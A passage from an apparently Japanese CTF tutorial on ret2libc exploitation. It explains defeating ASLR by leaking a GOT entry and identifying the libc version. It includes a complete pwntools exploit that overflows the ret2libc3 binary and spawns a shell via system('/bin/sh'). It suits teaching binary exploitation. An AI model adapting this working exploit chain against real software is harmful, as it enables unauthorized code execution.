- プログラムに ASLR 保護があっても、ランダム化されるのはアドレスの中間の部分だけで、最下位の 12 ビットは変化しません(ページフレームのサイズにアラインされるため。12 ビットは一般的な 4 KB に対応します)。また、libc は github 上で収集している人がいます。次を参照してください。
  - https://github.com/niklasb/libc-database

したがって、libc 中のある関数のアドレスが分かれば、そのプログラムが使っている libc を特定できます。そして system 関数のアドレスも分かります。

では、libc 中のある関数のアドレスをどう得るのでしょうか。一般によく使う方法は、got テーブルのリークです。つまり、ある関数に対応する got テーブルエントリの内容を出力します。**もちろん、libc の遅延バインディング(lazy binding)機構のため、すでに実行された関数のアドレスをリークする必要があります。**

もちろん、上記の手順でまず libc を得て、その後プログラムでオフセットを調べ、あらためて system のアドレスを得ることもできますが、手作業の回数が多くて少し面倒です。ここでは libc の利用ツールを1つ紹介します。詳細は readme を参照してください。

- https://github.com/lieanu/LibcSearcher

また、libc を得た後は、libc 中にも /bin/sh 文字列があるので、/bin/sh 文字列のアドレスも一緒に得られます。

ここでは __libc_start_main のアドレスをリークします。これはプログラムが最初に実行される場所だからです。基本的な利用の方針は次のとおりです。

- __libc_start_main のアドレスをリークする
- libc のバージョンを特定する
- system のアドレスと /bin/sh のアドレスを得る
- 元のプログラムを再度実行する
- スタックオーバーフローを引き起こして system(‘/bin/sh’) を実行する

exp は次のとおりです。

```python
#!/usr/bin/env python3
from pwn import *

pc = './ret2libc3'
aslr = True
context.log_level = 'debug'  
context.arch = 'i386' 

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
ret2libc3 = ELF('./ret2libc3')

p = process(pc, aslr=aslr)

if __name__ == '__main__':
    puts_plt = ret2libc3.plt['puts']
    libc_start_main_got = ret2libc3.got['__libc_start_main']
    start_addr = ret2libc3.symbols['_start']

    # log.info(f'start_addr --> 0x{start_addr:x}')
    
    payload = b'a' * 112
    payload += p32(puts_plt)
    payload += p32(start_addr)
    payload += p32(libc_start_main_got)

    p.sendline(payload)
    p.recvuntil(b'Can you find it !?')

    libc_start_main_addr = u32(p.recv(4))
    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
    system_addr = libc_base_addr + libc.symbols['system']

    binsh_offset = next(libc.search(b'/bin/sh\x00'))
    binsh_addr = libc_base_addr + binsh_offset

    payload2 = b'a' * 112
    payload2 += p32(system_addr)
    payload2 += p32(0xdeadbeef)  
    payload2 += p32(binsh_addr)  
    p.sendline(payload2)
    p.interactive()
```

### 問題

- train.cs.nctu.edu.tw: ret2libc

## 問題

- train.cs.nctu.edu.tw: rop
- 2013-PlaidCTF-ropasaurusrex
- Defcon 2015 Qualifier: R0pbaby

## 参考文献

- [乌云一步一步ROP篇(蒸米)](http://wooyun.jozxing.cc/static/drops/tips-6597.html)
- [手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)
- [手把手教你栈溢出从入门到放弃（下）](https://zhuanlan.zhihu.com/p/25892385)
- [【技术分享】現代的なスタックオーバーフロー利用技術の基礎: ROP](http://bobao.360.cn/learning/detail/3694.html)
